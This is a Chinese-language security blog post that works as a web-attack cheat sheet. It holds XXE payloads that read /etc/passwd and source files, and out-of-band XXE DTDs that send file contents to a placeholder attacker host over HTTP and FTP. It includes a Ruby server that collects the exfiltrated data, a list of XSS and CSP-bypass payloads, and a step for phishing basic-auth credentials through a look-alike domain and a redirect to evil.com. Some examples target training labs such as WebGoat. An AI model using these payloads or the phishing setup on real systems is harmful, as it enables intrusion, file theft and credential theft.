<!DOCTYPE html>





<html class="theme-next gemini use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="generator" content="Hexo 3.9.0">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">

<link rel="stylesheet" href="/css/main.css?v=7.3.0">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">


<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
    copycode: {"enable":true,"show_result":true,"style":null},
    fancybox: true,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    search: {
      root: '/',
      path: 'search.xml'
    },
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'copy',
      copy_success: 'succeed',
      copy_failure: 'failed'
    }
  };
</script>

  <meta name="description" content="Web FuzzXXE测试方法发现post请求的接口的时候，可以这样试试： 12345&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE a [&amp;lt;!ENTITY test &amp;quot;THIS IS A STRING!&amp;quot;&amp;gt;]&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;&amp;amp;test;&amp;lt">
<meta name="keywords" content="fuzz">
<meta property="og:type" content="article">
<meta property="og:title" content="Web Fuzzing">
<meta property="og:url" content="https://wh0ale.github.io/2018/12/18/2018-12-18-Web fuzzing/index.html">
<meta property="og:site_name" content="Wh0ale&#39;s Blog">
<meta property="og:description" content="Web FuzzXXE测试方法发现post请求的接口的时候，可以这样试试： 12345&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE a [&amp;lt;!ENTITY test &amp;quot;THIS IS A STRING!&amp;quot;&amp;gt;]&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;&amp;amp;test;&amp;lt">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181213170931-cd090c6e-feb6-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181213170933-ce4344dc-feb6-1.png">
<meta property="og:updated_time" content="2019-12-20T14:45:58.627Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Web Fuzzing">
<meta name="twitter:description" content="Web FuzzXXE测试方法发现post请求的接口的时候，可以这样试试： 12345&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE a [&amp;lt;!ENTITY test &amp;quot;THIS IS A STRING!&amp;quot;&amp;gt;]&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;&amp;amp;test;&amp;lt">
<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181213170931-cd090c6e-feb6-1.png">
  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
  <link rel="canonical" href="https://wh0ale.github.io/2018/12/18/2018-12-18-Web fuzzing/">


<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Web Fuzzing | Wh0ale's Blog</title>
  








  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Wh0ale's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
    <ul id="menu" class="menu">
        
        
        
          
          <li class="menu-item menu-item-home">
      
    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
      
    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
      
    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
      
    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
      
    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>
        <li class="menu-item menu-item-search">
          <a href="javascript:;" class="popup-trigger">
          
            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
        </li>
      
    </ul>
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>


    </div>
</nav>

</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
            

          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    
    <div class="reading-progress-bar"></div>

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/18/2018-12-18-Web fuzzing/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Wh0ale">
      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Wh0ale's Blog">
    </span>
      <header class="post-header">

        
          <h1 class="post-title" itemprop="name headline">Web Fuzzing

              
            
          </h1>
        

        <div class="post-meta">
        
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2018-12-18 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-18T00:00:00+08:00">2018-12-18</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2019-12-20 22:45:58" itemprop="dateModified" datetime="2019-12-20T22:45:58+08:00">2019-12-20</time>
              </span>
            
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon"
              >
                <i class="fa fa-eye"></i>
                 阅读次数： 
                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
              </span>
            </span>
          <br>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
              
                <span class="post-meta-item-text">本文字数：</span>
              
              <span title="本文字数">25k</span>
            </span>
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
              
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              
              <span title="阅读时长">23 分钟</span>
            </span>
          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">



      
        <h1 id="Web-Fuzz"><a href="#Web-Fuzz" class="headerlink" title="Web Fuzz"></a>Web Fuzz</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><p>发现post请求的接口的时候，可以这样试试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY test &quot;THIS IS A STRING!&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>如果发现了一个错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a</span><br><span class="line">[&lt;!ENTITY test &quot;nice string bro&quot;&gt;]</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>说明能够解析，试试读文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a</span><br><span class="line">[&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;]</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>或者用php伪协议：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a</span><br><span class="line">[&lt;!ENTITY test SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;]</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>得到的结果再base64解码即可。</p>
<h2 id="webgoat8"><a href="#webgoat8" class="headerlink" title="webgoat8"></a>webgoat8</h2><h3 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="测试方法"></a>测试方法</h3><p>试一试是否可以添加实体的评论：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY test &quot;THIS IS A STRING!&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;comment&gt;&lt;text&gt;&amp;test;&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>

<p>可以的话，试试file：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;comment&gt;&lt;text&gt;&amp;test;&lt;/text&gt;&lt;/comment&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MUTILLIDAE"><a href="#MUTILLIDAE" class="headerlink" title="MUTILLIDAE"></a>MUTILLIDAE</h2><p>要获取mutillidae上的文件，要在form表单提交的过程中使用测试的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a</span><br><span class="line">[&lt;!ENTITY TEST SYSTEM &quot;file:///etc/passwd&quot;&gt;]</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;methodCall&gt;&lt;methodName&gt;&amp;TEST;&lt;/methodName&gt;&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>或者把xml版本忽略掉：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a</span><br><span class="line">[&lt;!ENTITY TEST SYSTEM &quot;file:///etc/passwd&quot;&gt;]</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&lt;methodCall&gt;&lt;methodName&gt;&amp;TEST;&lt;/methodName&gt;&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<p>以及上面提到的php流：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a</span><br><span class="line">[&lt;!ENTITY TEST SYSTEM &quot;php://filter/convert.base64-encode/resource=phpinfo.php&quot;&gt;]</span><br><span class="line">&gt;</span><br><span class="line">&lt;methodCall&gt;&lt;methodName&gt;&amp;TEST;&lt;/methodName&gt;&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure>

<h2 id="OUT-OF-BAND"><a href="#OUT-OF-BAND" class="headerlink" title="OUT OF BAND"></a>OUT OF BAND</h2><h3 id="基础测试"><a href="#基础测试" class="headerlink" title="基础测试"></a>基础测试</h3><ol>
<li>使用 burp 的collaborator 然后单击<code>copy the payload to clipboard</code></li>
<li>将下面的code放入xml文件，然后上传：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">   &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;http://burp.collab.server&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>看看是否发送了请求<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181213170931-cd090c6e-feb6-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181213170931-cd090c6e-feb6-1.png" alt="img"></a><br>成功后，再利用其他payload</p>
<h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">wing.xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM</span><br><span class="line">  &quot;file:///etc/lsb-release&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM</span><br><span class="line">  &quot;http://&lt;evil attacker hostname&gt;:8000/evil.dtd&quot;&gt;</span><br><span class="line">  %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;&amp;send;&lt;/data&gt;</span><br><span class="line">vps-&gt;evil.dtd</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://&lt;evil attacker hostname&gt;:8000/?collect=%file;&apos;&gt;&quot;&gt; %all;</span><br><span class="line">host in dtd:</span><br><span class="line">python -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>

<h3 id="使用FTP读文件"><a href="#使用FTP读文件" class="headerlink" title="使用FTP读文件"></a>使用FTP读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">evil.xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % asd SYSTEM &quot;http://&lt;evil attacker hostname&gt;:8090/xxe_file.dtd&quot;&gt;</span><br><span class="line">%asd;</span><br><span class="line">%c;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;rrr;&lt;/a&gt;</span><br><span class="line">将dtd文件放在VPS上:</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY rrr SYSTEM &apos;ftp://&lt;evil attacker hostname&gt;:2121/%d;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>ruby利用脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">require &apos;socket&apos;</span><br><span class="line"></span><br><span class="line">ftp_server = TCPServer.new 2121</span><br><span class="line">http_server = TCPServer.new 8088</span><br><span class="line"></span><br><span class="line">log = File.open( &quot;xxe-ftp.log&quot;, &quot;a&quot;)</span><br><span class="line"></span><br><span class="line">payload = &apos;&lt;!ENTITY % asd SYSTEM &quot;file:///etc/passwd&quot;&gt;&apos;</span><br><span class="line"></span><br><span class="line">Thread.start do</span><br><span class="line">loop do</span><br><span class="line">  Thread.start(http_server.accept) do |http_client|</span><br><span class="line">    puts &quot;HTTP. New client connected&quot;</span><br><span class="line">    loop &#123;</span><br><span class="line">        req = http_client.gets()</span><br><span class="line">        break if req.nil?</span><br><span class="line">        if req.start_with? &quot;GET&quot;</span><br><span class="line">            http_client.puts(&quot;HTTP/1.1 200 OK\r\nContent-length: #&#123;payload.length&#125;\r\n\r\n#&#123;payload&#125;&quot;)</span><br><span class="line">        end</span><br><span class="line">        puts req</span><br><span class="line">    &#125;</span><br><span class="line">    puts &quot;HTTP. Connection closed&quot;</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">Thread.start do</span><br><span class="line">loop do</span><br><span class="line">  Thread.start(ftp_server.accept) do |ftp_client|</span><br><span class="line">    puts &quot;FTP. New client connected&quot;</span><br><span class="line">    ftp_client.puts(&quot;220 xxe-ftp-server&quot;)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req = ftp_client.gets()</span><br><span class="line">        break if req.nil?</span><br><span class="line">        puts &quot;&lt; &quot;+req</span><br><span class="line">        log.write &quot;get req: #&#123;req.inspect&#125;\n&quot;</span><br><span class="line"></span><br><span class="line">        if req.include? &quot;LIST&quot;</span><br><span class="line">            ftp_client.puts(&quot;drwxrwxrwx 1 owner group          1 Feb 21 04:37 test&quot;)</span><br><span class="line">            ftp_client.puts(&quot;150 Opening BINARY mode data connection for /bin/ls&quot;)</span><br><span class="line">            ftp_client.puts(&quot;226 Transfer complete.&quot;)</span><br><span class="line">        elsif req.include? &quot;USER&quot;</span><br><span class="line">            ftp_client.puts(&quot;331 password please - version check&quot;)</span><br><span class="line">        elsif req.include? &quot;PORT&quot;</span><br><span class="line">            puts &quot;! PORT received&quot;</span><br><span class="line">            puts &quot;&gt; 200 PORT command ok&quot;</span><br><span class="line">            ftp_client.puts(&quot;200 PORT command ok&quot;)</span><br><span class="line">        else</span><br><span class="line">            puts &quot;&gt; 230 more data please!&quot;</span><br><span class="line">            ftp_client.puts(&quot;230 more data please!&quot;)</span><br><span class="line">        end</span><br><span class="line">    &#125;</span><br><span class="line">    puts &quot;FTP. Connection closed&quot;</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">loop do</span><br><span class="line">    sleep(10000)</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>fuzz</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt</span><br></pre></td></tr></table></figure>

<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>对于asp的站点，我们用unicode编码尖括号，适用于存储型XSS：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;%uff1cscript%uff1ealert(&apos;XSS&apos;);%uff1c/script%uff1e&apos;</span><br></pre></td></tr></table></figure>

<h3 id="文件上传的XSS"><a href="#文件上传的XSS" class="headerlink" title="文件上传的XSS"></a>文件上传的XSS</h3><p>发现上传点的时候，可以试试用payload作为文件名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;.png</span><br></pre></td></tr></table></figure>

<p>or：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;.png</span><br></pre></td></tr></table></figure>

<p>or:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg onmouseover=alert(1)&gt;.svg</span><br></pre></td></tr></table></figure>

<h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>stuff.svg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;</span><br><span class="line">   &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">      alert(&apos;XSS!&apos;);</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;something:script xmlns:something=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(1)&lt;/something:script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="CSP-BYPASS"><a href="#CSP-BYPASS" class="headerlink" title="CSP BYPASS"></a>CSP BYPASS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src self: &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<h3 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h3><ul>
<li><code>svg/onload</code></li>
<li><code>&#39;-alert(1)-&#39;</code></li>
<li><code>eval(atob(&#39;YWxlcnQoMSk=&#39;))</code></li>
<li><code>&lt;iMg SrC=x OnErRoR=alert(1)&gt;</code></li>
<li><code>&lt;div onmouseover=&quot;alert(&#39;XSS&#39;);&quot;&gt;</code><br><code>&lt;/Textarea/&lt;/Noscript/&lt;/Pre/&lt;/Xmp&gt;&lt;Svg /Onload=confirm(document.domain)&gt;</code></li>
<li><code>x@x.com&lt;--</code>&lt;img/src=<code>onerror=alert(1)&gt; --!&gt;</code></li>
<li><code>&quot;&quot;[(!1+&quot;&quot;)[3]+(!0+&quot;&quot;)[2]+(&#39;&#39;+{})[2]][(&#39;&#39;+{})[5]+(&#39;&#39;+{})[1]+((&quot;&quot;[(!1+&quot;&quot;)[3]+(!0+&quot;&quot;)[2]+(&#39;&#39;+{})[2]])+&quot;&quot;)[2]+(!1+&#39;&#39;)[3]+(!0+&#39;&#39;)[0]+(!0+&#39;&#39;)[1]+(!0+&#39;&#39;)[2]+(&#39;&#39;+{})[5]+(!0+&#39;&#39;)[0]+(&#39;&#39;+{})[1]+(!0+&#39;&#39;)[1]](((!1+&quot;&quot;)[1]+(!1+&quot;&quot;)[2]+(!0+&quot;&quot;)[3]+(!0+&quot;&quot;)[1]+(!0+&quot;&quot;)[0])+&quot;(1)&quot;)()</code></li>
<li><code>oNcliCk=alert(1)%20)//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;%5Cx3csVg/&lt;img/src/onerror=alert(2)&gt;%5Cx3e</code></li>
</ul>
<h3 id="AUTH-CRED"><a href="#AUTH-CRED" class="headerlink" title="AUTH CRED"></a>AUTH CRED</h3><p>遇到http-only的时候：<br>使用钓鱼的基本身份验证获取其凭据</p>
<ol>
<li>注册一个和目标类似的域名</li>
<li><a href="https://github.com/ryhanson/phishery" target="_blank" rel="noopener">https://github.com/ryhanson/phishery</a></li>
<li>编译然后运行</li>
<li>设置payload----<code>&lt;img/src/onerror=document.location=&quot;evil.com/&quot;&gt;</code></li>
<li>等待目标上线</li>
</ol>
